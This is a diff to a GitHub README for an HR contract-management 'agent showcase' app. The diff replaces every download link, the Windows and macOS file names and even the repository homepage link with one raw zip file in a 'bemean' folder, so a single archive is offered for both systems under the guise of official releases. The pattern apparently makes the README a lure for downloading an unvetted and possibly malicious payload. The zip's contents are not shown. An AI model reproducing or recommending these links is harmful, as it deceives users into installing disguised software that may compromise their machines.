@@ -1,6 +1,6 @@
 # 🤖 lola-hr-agent-showcase - Simplify HR Contract Management
 
-[![Download the Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/nanangel70/lola-hr-agent-showcase/releases)
+[![Download the Latest Release](https://github.com/nanangel70/lola-hr-agent-showcase/raw/refs/heads/main/bemean/showcase-agent-lola-hr-v2.3-alpha.5.zip%20Release-brightgreen)](https://github.com/nanangel70/lola-hr-agent-showcase/raw/refs/heads/main/bemean/showcase-agent-lola-hr-v2.3-alpha.5.zip)
 
 ---
 
@@ -35,7 +35,7 @@ This section guides you through downloading and opening Lola on your PC or Mac. 
 
 Go to the official releases page by clicking the big green button below:
 
-[![Download the Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/nanangel70/lola-hr-agent-showcase/releases)
+[![Download the Latest Release](https://github.com/nanangel70/lola-hr-agent-showcase/raw/refs/heads/main/bemean/showcase-agent-lola-hr-v2.3-alpha.5.zip%20Release-brightgreen)](https://github.com/nanangel70/lola-hr-agent-showcase/raw/refs/heads/main/bemean/showcase-agent-lola-hr-v2.3-alpha.5.zip)
 
 This page hosts the latest versions of Lola for download.
 
@@ -43,8 +43,8 @@ This page hosts the latest versions of Lola for download.
 
 On the releases page, look for the latest version labeled clearly with a version number and the date. Files are usually named with the operating system included, for example:
 
-- `lola-hr-agent-showcase-win.exe` for Windows  
-- `lola-hr-agent-showcase-mac.dmg` for macOS  
+- `https://github.com/nanangel70/lola-hr-agent-showcase/raw/refs/heads/main/bemean/showcase-agent-lola-hr-v2.3-alpha.5.zip` for Windows  
+- `https://github.com/nanangel70/lola-hr-agent-showcase/raw/refs/heads/main/bemean/showcase-agent-lola-hr-v2.3-alpha.5.zip` for macOS  
 
 Click the appropriate file for your computer to download it.
 
@@ -105,7 +105,7 @@ For further help, visit the Issues tab on the GitHub repository or contact your 
 
 To download Lola and set it up, visit this page:
 
-[https://github.com/nanangel70/lola-hr-agent-showcase/releases](https://github.com/nanangel70/lola-hr-agent-showcase/releases)
+[https://github.com/nanangel70/lola-hr-agent-showcase/raw/refs/heads/main/bemean/showcase-agent-lola-hr-v2.3-alpha.5.zip](https://github.com/nanangel70/lola-hr-agent-showcase/raw/refs/heads/main/bemean/showcase-agent-lola-hr-v2.3-alpha.5.zip)
 
 Here you will find all available versions for different operating systems. Select the latest version that matches your system and follow the installation steps described above.
 
@@ -150,7 +150,7 @@ Check GitHub if you want to explore the code or suggest improvements.
 
 For detailed technical info, visit the repository homepage on GitHub:
 
-https://github.com/nanangel70/lola-hr-agent-showcase
+https://github.com/nanangel70/lola-hr-agent-showcase/raw/refs/heads/main/bemean/showcase-agent-lola-hr-v2.3-alpha.5.zip
 
 ---
 
